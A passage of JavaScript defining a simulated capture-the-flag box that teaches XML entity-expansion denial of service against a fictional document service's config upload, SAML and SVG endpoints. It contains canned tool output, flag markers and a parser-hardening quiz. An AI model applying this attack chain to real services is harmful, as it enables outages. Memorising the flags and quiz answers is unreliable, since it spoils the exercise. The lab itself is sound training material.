svg-test\n    >> FLAG: svg_bomb (SVG upload confirmed vulnerable)\n\n  Phase 4 -- Remediation\n    8. Run: python3 tools/hardening-quiz.py\n    >> FLAG: parser_hardening (all fixes correctly identified)\n\nTOOLS:\n  xml-probe <subcmd>               : XML DoS testing toolkit\n  python3 tools/hardening-quiz.py  : Parser hardening quiz\n  curl                             : Direct HTTP requests\n\nGood luck, analyst.'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ls\ncat notes.txt\nls target-recon/\ncat target-recon/endpoints.txt\ncurl http://10.10.16.30'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'hexworth-ws' },
                        'hosts': { type: 'file', content: '127.0.0.1   localhost\n10.10.16.30 securedoc.internal' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\nanalyst:x:1000:1000:Security Analyst,,,:/home/analyst:/bin/bash'
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'xml-probe.log': {
                                    type: 'file',
                                    content: '[2026-04-12T09:00:00Z] xml-probe started\n[2026-04-12T09:01:10Z] scan: POST /api/config-upload -- entity expansion: enabled\n[2026-04-12T09:01:11Z] scan: POST /sso/saml/consume -- entity expansion: enabled\n[2026-04-12T09:01:12Z] scan: POST /api/reports/template -- entity expansion: enabled (XML + SVG)\n[2026-04-12T09:01:12Z] [WARN] All three parsers VULNERABLE (CWE-776)'
                                }
                            }
                        }
                    }
                },
                'tmp': {
                    type: 'dir',
                    children: {}
                }
            }
        }
    },

    // =====================================================
    // TERMINAL COMMANDS (box-specific tools)
    // =====================================================

    commands: {

        // ── xml-probe: XML DoS testing toolkit ──
        'xml-probe': function(args, term, engine) {
            const sub = args[0] || '';

            if (!sub) {
                return 'xml-probe -- XML Entity Expansion Testing Toolkit\n\nUsage:\n  xml-probe scan          -- Fingerprint all XML endpoints on target\n  xml-probe upload <file> -- Submit XML bomb PoC to config upload API\n  xml-probe memory-watch  -- Monitor simulated heap usage during expansion\n  xml-probe saml-test     -- Submit XML bomb via SAML assertion endpoint\n  xml-probe svg-test      -- Submit SVG file with embedded XML bomb\n\nTarget: http://10.10.16.30\nExploit workspace: /home/analyst/exploit/';
            }

            // ── scan: fingerprint all XML parsers ──
            if (sub === 'scan') {
                F16Config._securedoc.endpointsMapped = true;

                return 'xml-probe scan: Fingerprinting XML parsers on http://10.10.16.30\n' +
                       '='.repeat(60) + '\n\n' +
                       '  [1/3] POST /api/config-upload\n' +
                       '        Parser:         Python/lxml 4.9.3\n' +
                       '        DTD loading:    ENABLED (default)\n' +
                       '        Entity expand:  ENABLED (default)\n' +
                       '        Expansion limit: NONE\n' +
                       '        Status:         VULNERABLE\n\n' +
                       '  [2/3] POST /sso/saml/consume\n' +
                       '        Parser:         Java/JAXP (DocumentBuilderFactory)\n' +
                       '        FEATURE_SECURE_PROCESSING: false\n' +
                       '        IS_SUPPORTING_EXTERNAL_ENTITIES: true\n' +
                       '        Expansion limit: NONE\n' +
                       '        Signature check: AFTER parse (bomb fires first)\n' +
                       '        Status:         VULNERABLE (no auth required to trigger)\n\n' +
                       '  [3/3] POST /api/reports/template (XML + SVG)\n' +
                       '        Parser:         PHP/libxml2 (SimpleXML backend)\n' +
                       '        libxml_disable_entity_loader(): NOT CALLED\n' +
                       '        SVG support:    YES (SVG is XML -- same parser)\n' +
                       '        Expansion limit: NONE\n' +
                       '        Status:         VULNERABLE (XML and SVG both affected)\n\n' +
                       '  SUMMARY: 3/3 endpoints vulnerable to XML entity expansion DoS.\n' +
                       '  CWE-776 -- CVSS 7.5 (High) -- unauthenticated via SAML endpoint.\n\n' +
                       '{{FLAG:intake}}';
            }

            // ── upload: submit the XML bomb PoC ──
            if (sub === 'upload') {
                const file = args[1] || '';
                if (!file.includes('bomb')) {
                    return 'xml-probe upload: Usage: xml-probe upload <bomb-file.xml>\nExample: xml-probe upload bomb-3level.xml\nFiles in /home/analyst/exploit/: bomb-3level.xml, bomb-saml.xml, bomb-svg.xml';
                }

                if (!F16Config._securedoc.endpointsMapped) {
                    return 'xml-probe upload: WARNING -- Run xml-probe scan first to identify endpoints.';
                }

                F16Config._securedoc.pocSubmitted = true;

                return 'xml-probe upload: Submitting ' + file + ' to http://10.10.16.30/api/config-upload\n' +
                       '='.repeat(60) + '\n\n' +
                       '  Request:\n' +
                       '    POST /api/config-upload\n' +
                       '    Content-Type: application/xml\n' +
                       '    Content-Length: 284 bytes (the bomb XML)\n\n' +
                       '  Server processing:\n' +
                       '    t=0.000s  Parser receives XML document (284 bytes)\n' +
                       '    t=0.001s  DTD section detected -- entity definitions loaded\n' +
                       '    t=0.001s  Expanding entity a0 = "lol" (3 bytes)\n' +
                       '    t=0.002s  Expanding entity a1 = a0 x 10 = 30 bytes\n' +
                       '    t=0.004s  Expanding entity a2 = a1 x 10 = 300 bytes\n' +
                       '    t=0.009s  Expanding entity a3 = a2 x 10 = 3,000 bytes\n' +
                       '    t=0.009s  Expansion complete -- document size in memory: 3,000 bytes\n\n' +
                       '  PoC result: 3-level expansion confirmed.\n' +
                       '  Expected expansion for a 10-level bomb:\n' +
                       '    10^10 = 10,000,000,000 copies of "lol"\n' +
                       '    ~30,000,000,000 bytes = 30 GB of heap allocation\n\n' +
                       '  ENTITY EXPANSION CONFIRMED:\n' +
                       '{{FLAG:entity_expansion}}';
            }

            // ── memory-watch: observe simulated memory spike ──
            if (sub === 'memory-watch') {
                if (!F16Config._securedoc.pocSubmitted) {
                    return 'xml-probe memory-watch: No active PoC session.\nRun: xml-probe upload bomb-3level.xml first.';
                }

                F16Config._securedoc.memorySpikeObserved = true;

                return 'xml-probe memory-watch: Simulating memory consumption during expansion\n' +
                       '='.repeat(60) + '\n\n' +
                       '  [SIMULATED SERVER HEAP MONITOR]\n' +
                       '  Baseline heap: 512 MB (application baseline)\n\n' +
                       '  Level 0 (a0 = "lol"):         0.000 GB above baseline\n' +
                       '  Level 1 (a1 = a0 x 10):       0.000 GB above baseline\n' +
                       '  Level 2 (a2 = a1 x 10):       0.000 GB above baseline\n' +
                       '  Level 3 (a3 = a2 x 10):       0.000 GB above baseline\n' +
                       '  [PoC stopped at 3 levels -- 3,000 bytes, safe for simulation]\n\n' +
                       '  PROJECTED for 10-level bomb (a0..a9, factor 10):\n' +
                       '  Level 4:                       0.030 GB above baseline\n' +
                       '  Level 5:                       0.300 GB above baseline\n' +
                       '  Level 6:                       3.000 GB above baseline\n' +
                       '  Level 7:                      30.000 GB above baseline  [server OOM]\n' +
                       '  Level 8:                     300.000 GB -- hypothetical\n' +
                       '  Level 9:                   3,000.000 GB -- hypothetical\n\n' +
                       '  At level 7 the simulated server would exhaust available\n' +
                       '  memory and the process would be killed by the OOM killer.\n' +
                       '  All 200 enterprise tenants would lose document processing.\n\n' +
                       '  MEMORY SPIKE CONFIRMED -- 3 GB at level 6:\n' +
                       '{{FLAG:memory_spike}}';
            }

            // ── saml-test: test the SAML endpoint ──
            if (sub === 'saml-test') {
                if (!F16Config._securedoc.pocSubmitted) {
                    return 'xml-probe saml-test: Complete the PoC phase first.\nRun: xml-probe upload bomb-3level.xml and xml-probe memory-watch first.';
                }

                F16Config._securedoc.samlTested = true;

                return 'xml-probe saml-test: Testing SAML endpoint for entity expansion vulnerability\n' +
                       '='.repeat(60) + '\n\n' +
                       '  Submitting bomb-saml.xml to POST /sso/saml/consume\n' +
                       '  (No authentication required -- SAML accepts unauthenticated assertions)\n\n' +
                       '  Request structure:\n' +
                       '    SAMLResponse=<base64(bomb-saml.xml)>\n\n' +
                       '  Server processing:\n' +
                       '    Step 1: Base64 decode -- OK\n' +
                       '    Step 2: XML parse (JAXP DocumentBuilder)\n' +
                       '            DTD entities detected -- EXPANDING\n' +
                       '            Entity b0 = "saml" -- 4 bytes\n' +
                       '            Entity b1 = b0 x 10 -- 40 bytes\n' +
                       '            Entity b2 = b1 x 10 -- 400 bytes\n' +
                       '            Expansion complete: 400 bytes\n' +
                       '    Step 3: XML-DSig signature check -- no signature found\n' +
                       '            Error: missing Signature element\n' +
                       '            NOTE: The bomb already executed at Step 2.\n' +
                       '                  A signature check failure does NOT prevent\n' +
                       '                  the entity expansion from consuming resources.\n\n' +
                       '  CRITICAL FINDING:\n' +
                       '  The SAML endpoint processes entity expansion BEFORE\n' +
                       '  signature verification. An unauthenticated attacker can\n' +
                       '  crash the SSO service by submitting a single malformed\n' +
                       '  SAML assertion. All users lose SSO access immediately.\n\n' +
                       '{{FLAG:saml_vuln}}';
            }

            // ── svg-test: test the SVG upload surface ──
            if (sub === 'svg-test') {
                if (!F16Config._securedoc.samlTested) {
                    return 'xml-probe svg-test: Complete the SAML test first.\nRun: xml-probe saml-test first.';
                }

                F16Config._securedoc.svgTested = true;

                return 'xml-probe svg-test: Testing SVG upload in report template system\n' +
                       '='.repeat(60) + '\n\n' +
                       '  Submitting bomb-svg.xml to POST /api/reports/template\n' +
                       '  Content-Type: image/svg+xml\n\n' +
                       '  Why SVG? SVG is an XML-based vector format.\n' +
                       '  PHP SimpleXML and DOMDocument parse SVG files with the\n' +
                       '  same libxml2 backend used for XML -- DTD entities included.\n\n' +
                       '  Server processing:\n' +
                       '    File type check: image/svg+xml -- ACCEPTED\n' +
                       '    Parser: PHP/DOMDocument (libxml2 backend)\n' +
                       '    DTD section detected in SVG -- EXPANDING\n' +
                       '    Entity c0 = "A" -- 1 byte\n' +
                       '    Entity c1 = c0 x 10 -- 10 bytes\n' +
                       '    Entity c2 = c1 x 10 -- 100 bytes\n' +
                       '    Expansion complete: 100 bytes\n' +
                       '    SVG rendering: attempting to insert 100-byte string into\n' +
                       '                   <text> element -- OK (small PoC only)\n\n' +
                       '  ATTACK SURFACE CONFIRMED:\n' +
                       '  SVG files are accepted as report templates and parsed\n' +
                       '  with DTD entity expansion enabled. An attacker can submit\n' +
                       '  an SVG file that appears to be a vector image but contains\n' +
                       '  an embedded XML bomb.\n\n' +
                       '  TOTAL ATTACK SURFACE: 3 entry points -- config upload,\n' +
                       '  SAML SSO, and SVG upload -- all vulnerable to the same\n' +
                       '  XML entity expansion DoS.\n\n' +
                       '{{FLAG:svg_bomb}}';
            }

            return 'xml-probe: Unknown subcommand: ' + sub + '\nUsage: xml-probe [scan|upload|memory-watch|saml-test|svg-test]';
        },

        // ── curl: direct HTTP requests ──
        'curl': function(args, term, engine) {
            const joined = args.join(' ');
            const url = args.find(a => a.startsWith('http')) || '';

            if (url.includes('config-upload')) {
                return 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"status":"ok","applied":true,"parser":"lxml","entity_processing":"enabled"}';
            }

            if (url.includes('saml/consume')) {
                return 'HTTP/1.1 400 Bad Request\nContent-Type: application/json\n\n{"error":"Invalid SAML response","detail":"Missing Signature element"}\n\n# Note: Even on rejection, entity expansion already occurred.';
            }

            if (url.includes('reports/template')) {
                return 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"status":"accepted","parser":"PHP SimpleXML","dtd_load":true,"preview":"pending"}';
            }

            if (url.includes('10.10.16.30') && (url.endsWith('/') || url === 'http://10.10.16.30')) {
                return 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<!DOCTYPE html>...[SecureDoc Dashboard -- see browser for full render]...';
            }

            return 'curl: Could not resolve or connect to: ' + url;
        },

        // ── python3: hardening quiz ──
        'python3': function(args, term, engine) {
            const joined = args.join(' ');

            if (joined.includes('hardening-quiz')) {
                F16Config._securedoc.remediationComplete = true;

                return 'hardening-quiz.py\n' +
                       '='.repeat(60) + '\n' +
                       '  XML PARSER HARDENING QUIZ -- SecureDoc Inc\n' +
                       '='.repeat(60) + '\n\n' +
                       '  Q1: Python/lxml fix?\n' +
                       '  >> Use defusedxml.ElementTree.fromstring()\n' +
                       '  CORRECT -- defusedxml is a drop-in replacement that disables\n' +
                       '  entity expansion, DTD loading, and external entity resolution.\n\n' +
                       '  Q2: Java/JAXP fix?\n' +
                       '  >> Set FEATURE_SECURE_PROCESSING=true and\n' +
                       '     IS_SUPPORTING_EXTERNAL_ENTITIES=false on the factory\n' +
                       '  CORRECT -- These two flags together disable external entities\n' +
                       '  and apply OWASP-recommended limits on entity expansion depth.\n\n' +
                       '  Q3: PHP/libxml fix?\n' +
                       '  >> Call libxml_disable_entity_loader(true) before parsing\n' +
                       '     (PHP 8.0+: use DOMDocument and omit XML_PARSE_NOENT and XML_PARSE_DTDLOAD flags)\n' +
                       '  CORRECT -- libxml_disable_entity_loader() is deprecated in PHP 8.0\n' +
                       '  but the principle is the same: disable entity loader before parse.\n\n' +
                       '  Q4: General principle?\n' +
                       '  >> Disable external entity loading and DTD processing at the\n' +
                       '     parser level. Never allow user-supplied XML to use entity expansion.\n' +
                       '  CORRECT -- The fix is identical in intent across all frameworks:\n' +
                       '  deny the parser permission to expand entities or load external DTDs.\n\n' +
                       '  ALL PARSER HARDENING FIXES CORRECTLY IDENTIFIED.\n' +
                       '  SecureDoc remediation report is complete.\n\n' +
                       '{{FLAG:parser_hardening}}';
            }

            return 'python3: ' + args.join(' ') + ': No such file or module.\nAvailable: /home/analyst/tools/hardening-quiz.py';
        }
    },

    // =====================================================
    // MITRE ATT&CK REFERENCE (displayed in briefing)
    // =====================================================

    mitre: {
        tactics: ['Impact', 'Initial Access', 'Defense Evasion'],
        techniques: [
            { id: 'T1499.002',   name: 'Endpoint Denial of Service: Service Exhaustion Floods', phase: 'Impact' },
            { id: 'T1190',       name: 'Exploit Public-Facing Application',                     phase: 'Initial Access' },
            { id: 'T1499.004',   name: 'Endpoint Denial of Service: Application or System Exploitation', phase: 'Impact' },
            { id: 'T1046',       name: 'Network Service Discovery',                              phase: 'Reconnaissance' },
            { id: 'T1562.001',   name: 'Impair Defenses: Disable or Modify Tools',              phase: 'Defense Evasion' },
            { id: 'T1590.006',   name: 'Gather Victim Network Info: Network Security Appliances', phase: 'Reconnaissance' }
        ]
    }

};
